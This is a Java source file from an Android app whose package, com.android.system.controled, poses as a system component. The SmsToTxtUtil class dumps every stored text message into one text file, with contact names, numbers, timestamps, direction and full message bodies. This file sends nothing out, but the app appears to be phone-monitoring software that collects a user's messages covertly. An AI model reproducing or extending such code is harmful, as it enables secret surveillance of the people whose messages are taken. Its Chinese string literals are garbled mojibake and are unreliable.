package com.android.system.controled.util;

import java.util.ArrayList;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.SmsInfo;
import com.android.system.controled.db.SdcardDbOpera;

public class SmsToTxtUtil {

	private static SmsToTxtUtil mInstence;

	private SmsToTxtUtil() {
		
	}

	public static SmsToTxtUtil getInstence() {
		if (mInstence == null) {
			mInstence = new SmsToTxtUtil();
		}
		return mInstence;
	}

	public synchronized void saveAllSmsToTextFile() {
		
		Debug.e("", "saveAllSmsToTextFile");
		
		SdcardDbOpera db = SdcardDbOpera.getInstence();

		ArrayList<SmsInfo> smss = db.getAllSms();
		if (MainApplication.FILE_SMS_TEXT.exists()) {
			MainApplication.FILE_SMS_TEXT.delete();
		}
		
		StringBuffer sb = new StringBuffer();
		sb.append("ע�⣺����¼�Ǽ�������װ���ֻ���֮��������Ķ���������¼����ʹ���������շ����ź�ɾ�����ţ��������Ի��¼������\r\n");
		sb.append("[��ʱ��˳����ʾ]\r\n\r\n");
		if (smss != null && smss.size() > 0) {
			String dateTemp = "";
			
			for (SmsInfo sms : smss) {

				String date = TimeUtil.longToDateString(sms.getDate());

				if (!dateTemp.equals(date)) {
					dateTemp  = String.valueOf(date);
					sb.append("�� ").append(date).append("��\r\n\r\n\r\n");
				}

				if (sms.getType() == 1) {
					sb.append("�����š�\r\n");
				} else {
					sb.append("�����š�\r\n");
				}

				sb.append(TimeUtil.longToTime(sms.getDate()));

				if (sms.getName().equals(sms.getAddress())) {
					sb.append("\r\n�Է���").append(sms.getName());
				} else {
					sb.append("\r\n�Է���").append(sms.getName()).append(" ").append(sms.getAddress());
				}

				sb.append("\r\n���ݣ�").append(sms.getBody()).append("\r\n\r\n");
			}
		} else {
			sb.append("���޶��ż�¼��");
		}
		
		FileUtil.writeFile(sb.toString(), MainApplication.FILE_SMS_TEXT, true);
	}
}
